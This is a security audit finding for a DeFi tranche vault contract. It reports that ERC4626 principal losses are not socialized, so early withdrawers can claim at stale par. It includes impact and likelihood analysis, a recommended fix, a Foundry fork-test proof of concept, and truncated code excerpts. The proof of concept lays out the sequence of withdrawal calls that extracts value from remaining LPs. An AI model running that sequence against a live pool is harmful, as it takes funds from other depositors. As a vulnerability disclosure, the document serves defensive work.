### Title
Programmable-borrower ERC4626 principal losses are never socialized, letting early withdrawers drain remaining vault funds - (File: contracts/IdleCDOEpochVariant.sol)

### Summary
In programmable-borrower mode, an ERC4626 vault loss only reduces reported epoch interest and is floored at zero; the impaired principal is not burned from strategy tokens or otherwise haircut from tranche NAV. A tranche holder can therefore wait for the ordinary post-loss epoch settlement, request withdrawal at stale par value, and receive assets that should have been shared as a loss. The result is direct transfer of the impairment to non-withdrawing LPs and pool insolvency.

### Finding Description
`ProgrammableBorrower.totalInterestDueNow()` computes `vaultInterest + borrowerInterestAccruedNow + bufferInterest - vaultLoss`, but returns zero whenever the loss exceeds gains, thereby discarding the remaining principal-loss component. [1](#0-0) 

The public `stopEpoch(0, 0)` path always calls `_stopEpoch` with `_lossAmount == 0`; in programmable mode, `_resolveStopEpochInterest()` replaces the manager-provided value with only `totalInterestDueNow()`. [2](#0-1) [3](#0-2) 

A strategy-token loss burn occurs only when `_lossAmount` is nonzero, so the ordinary programmable stop leaves the CDO’s strategy-token balance and tranche prices at their pre-loss values. [4](#0-3) 

`onStopEpoch()` then snapshots the impaired vault balance as the next buffer baseline and disables epoch accounting, permanently hiding the prior loss from subsequent `vaultLoss()` calculations. [5](#0-4) 

During the following buffer, withdrawals burn the CDO’s full principal backing and create a pending claim, even though the programmable borrower holds fewer underlying assets than the aggregate tranche NAV. [6](#0-5)  The next successful stop funds and pays that receipt at par, while the missing vault assets remain assigned to all remaining LPs. [7](#0-6) [8](#0-7) 

### Impact Explanation
The solvency and loss-waterfall invariant is broken: active tranche NAV can exceed real programmable-borrower assets by the full residual ERC4626 loss. [9](#0-8) 

For example, if two LPs each account for `50,000 USDC` of a `100,000 USDC` pool and the external vault loses `20,000 USDC`, the first LP can still withdraw `50,000 USDC`; only `30,000 USDC` remains for the second LP’s `50,000 USDC` claim. The first LP extracts `10,000 USDC` above their fair post-loss share, while the pool carries a `20,000 USDC` principal shortfall. [10](#0-9) 

### Likelihood Explanation
Only an honest manager’s normal `stopEpoch`/`startEpoch` sequence is required; the attacker can be an ordinary KYC-passed tranche holder who submits `requestWithdraw()` after the loss has been masked. No privileged caller, malicious borrower, donation, stale oracle, or failed transaction is needed for the withdrawal leg. [11](#0-10) 

The existing `_onlyIdleCDO`, epoch-wait, skim, KYC, and reserve checks do not stop this because the receipt is created at the stale accounting value and is funded later at par. Production tests already demonstrate that `vaultLoss()` can be positive while `totalInterestDueNow()` floors to zero. [12](#0-11) 

### Recommendation
Expose an atomic signed net-PnL value from `IProgrammableBorrower`, rather than a nonnegative `totalInterestDueNow()`.

- Return `int256(totalGain) - int256(vaultLoss)` from the borrower.
- When the value is positive, preserve the current minted-interest flow.
- When negative, set epoch interest to zero and route the absolute residual loss through `previewLossAdjustedWithdrawFunds()` and the existing strategy-token burn/BB-first accounting path.
- Do not use raw `vaultLoss()` independently, because borrower interest and buffer interest may already offset part of the impairment. [13](#0-12) [14](#0-13) 

### Proof of Concept
The following Foundry fork test follows the existing programmable-borrower harness. The vault impairment is a market-loss setup primitive; the exploit transactions are only Alice’s ordinary withdrawal request and claim.

```solidity
function testForkVaultLossIsNotSocializedAndEarlyLPDrainsPool() external {
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");

    uint256 amount = 50_000 * oneScale;
    uint256 loss = 20_000 * oneScale;

    vm.prank(owner);
    cdoEpoch.setIsInterestMinted(true);

    _depositWithUser(alice, amount, true);
    _depositWithUser(bob, amount, true);

    _startEpochAndCheckPrices(0);
    assertApproxEqAbs(_programmableVaultAssets(), 100_000 * oneScale, 2);

    // Establish a real ERC4626 principal loss on the live-fork vault.  In the
    // existing harness this can be represented by removing vault shares; the
    // subsequent protocol actions are unprivileged LP calls.
    uint256 shares = morphoVault.balanceOf(address(programmableBorrower));
    uint256 lossShares = shares * loss / (100_000 * oneScale);
    programmableBorrower.rescueTokens(
        address(morphoVault),
        makeAddr("externalVaultLoss"),
        lossShares
    );

    assertGt(programmableBorrower.vaultLoss(), 0);
    assertEq(programmableBorrower.totalInterestDueNow(), 0);

    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    // BUG: 20% of principal is gone, but tranche NAV/price remains at par.
    assertApproxEqAbs(
        cdoEpoch.virtualPrice(address(aaTranche)),
        ONE_TRANCHE_TOKEN,
        2,
        "vault loss was not applied to tranche NAV"
    );

    // Alice requests during the buffer at the stale par price.
    vm.prank(alice);
    uint256 aliceReceipt = cdoEpoch.requestWithdraw(0, address(aaTranche));
    assertEq(aliceReceipt, amount);

    vm.warp(cdoEpoch.epochEndDate() + cdoEpoch.bufferPeriod() + 1);
    vm.prank(manager);
    cdoEpoch.startEpoch();

    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    uint256 aliceBefore = underlying.balanceOf(alice);
    vm.prank(alice);
    cdoEpoch.claimWithdrawRequest();

    assertEq(
        underlying.balanceOf(alice) - aliceBefore,
        amount,
        "Alice withdrew at par despite the vault loss"
    );

    // Bob's remaining 50k claim is backed by only 30k.  Fair post-loss value
    // for each LP was 40k, so Alice extracted 10k from Bob's claim and the
    // facility is insolvent by the full 20k loss.
    assertApproxEqAbs(programmableBorrower.totalUnderlying(), 30_000 * oneScale, 5);
    assertEq(strategy.balanceOf(address(cdoEpoch)), amount);
}
```

  /// @notice Total net epoch interest due to the pool at stop.
  /// @dev This is the single value read by IdleCDO to price the epoch: borrower contractual
  /// interest plus paid buffer interest plus positive vault PnL minus vault losses. It is a
  /// pool-facing value, so it can be lower than `borrowerInterestDebt` when the borrower still
  /// owes full contractual interest but the vault sleeve suffered a loss.
  function totalInterestDueNow() external view returns (uint256) {
    (uint256 vaultInterest, uint256 loss) = _vaultNetInterest();
    uint256 totalGain = vaultInterest + borrowerInterestAccruedNow() + bufferInterest;
    return totalGain > loss ? totalGain - loss : 0;
  }

  /// @notice Compute the net vault delta split into interest and loss (mutually exclusive).
  function _vaultNetInterest() internal view returns (uint256 interest, uint256 loss) {

    if (netDelta > 0) {
      interest = uint256(netDelta);
    } else {
      loss = uint256(-netDelta);

  function previewLossAdjustedWithdrawFunds(uint256 _lossAmount) external view returns (uint256 pendingToFund, uint256 activeLoss) {
    uint256 pendingBasis = pendingWithdraws;
    // Full zero-loss funding is safe for legacy aggregate receipts and needs no migration call.
    if (_lossAmount == 0) return (pendingBasis, _lossAmount);

    IIdleCDOEpochVariant cdo = IIdleCDOEpochVariant(idleCDO);
    uint256 activeBasis = _lossActiveBasis(cdo);
    if (pendingBasis == 0) {
      if (_lossAmount > activeBasis) revert NotAllowed();
      return (0, _lossAmount);
    }

    // Legacy pending receipts do not have the per-epoch ownership data needed to store a haircut.
    if (!defaultRecoveryInitialized) revert NotAllowed();
    uint256 totalBasis = activeBasis + pendingBasis;
    if (_lossAmount >= totalBasis) revert NotAllowed();

    uint256 pendingLoss = _lossAmount * pendingBasis / totalBasis;
    pendingToFund = pendingBasis - pendingLoss;
    activeLoss = _lossAmount - pendingLoss;
